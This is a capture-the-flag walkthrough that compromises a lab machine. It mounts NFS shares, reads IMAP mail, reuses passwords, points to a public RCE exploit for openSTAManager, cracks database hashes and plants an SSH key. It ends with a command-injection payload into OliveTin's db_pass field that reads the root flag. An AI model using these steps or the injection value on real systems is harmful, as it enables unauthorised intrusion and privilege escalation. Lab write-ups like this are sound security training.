Service discovery with nmap

Port 111, rpcbind is open on the target, use;
sudo showmount -e <TargetIp>

mount the share folder using;
mkdir ./localMnt && sudo mount -t nfs <TargetIP>:shareFolder ./localMnt

Within the share folder, find creds to the mail001 vhost

Port 993 (imaps) was also opened, so we use curl to access it;
curl -s --url "imaps://Targetip" --user "username:password" -k

Read through the inbox list with;
curl -s --url "imaps://Targetip/INBOX/;MAILINDEX=1" --user "username:password" -k

In this inbox, another username is found, so we try if there's a password reuse, with that discovered password, so we try;
curl -s --url "imaps://Targetip" --user "username2:password" -k

Read through this users inbox, to find yet another vhost on the target ip

Navigate to this newly discovered vhost and login,openSTAManager v2.9.8 runs on this vhost, which is vulnerable to CVE-2026-38751,
Finnd the Doc here https://www.sentinelone.com/vulnerability-database/cve-2026-38751/
And the POC here https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751

Once remote access is obtain, see the users found in /home directory

Now, back on the openSTAManager, use the backup functionality and create a full backup.

Inside this backup, find database.sql (open with any text editor, or sqlite3) and search for user hashes (user in /home)

Crack the found hash using; john ./hash_file_name.txt (or any cracking hash)

Back on the RCE terminal, Use 'su <username>' and provide their password to login, the user flag is found in this users home directory



ROOT
use ssh-keygen -t ed25519 -f ~/.ssh/haris_ssh -N "" to generate a public key for haris (On the attack box)

make an .ssh folder for haris (on the target box) at /home/haris and place the public key created above, into the authorized_keys and chmod for the .ssh folder and authorized_keys file

using
mkdir /home/haris/.ssh

echo "<ssh-key>" > /home/haris/.ssh/authorized_keys

chmod 700 /home/haris/.ssh

chmod 600 /home/haris/.ssh/authorized_keys

chown -R haris:haris /home/haris/.ssh


once done, ssh into the machine with no creds using;
ssh -i ./haris_ssh -o IdentitiesOnly=yes haris@targetIp

the OliveTin service running on 127.0.0.1:1337 is vulnerable to code injection as db_pass can be broken out off.

(
line 261 to 263 of the /etc/OliveTin/config.yaml file
<<id: backup_database
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql>>
)

the db_pass single qoute can easily be closed to allow for code execution

but first, the service runs locally on the machine, so we use;
ssh -i ~/.ssh/haris_ssh -o IdentitiesOnly=yes -L 1337:127.0.0.1:1337 haris@<targetIp>

open a web browser, and navigate to http://localhost:1337/ to access the oliveTin web interface on the attackBox

in Backup Database pass < x' ; cat /root/root.txt ; # > as the value of dp_pass 

thus providing the root flag
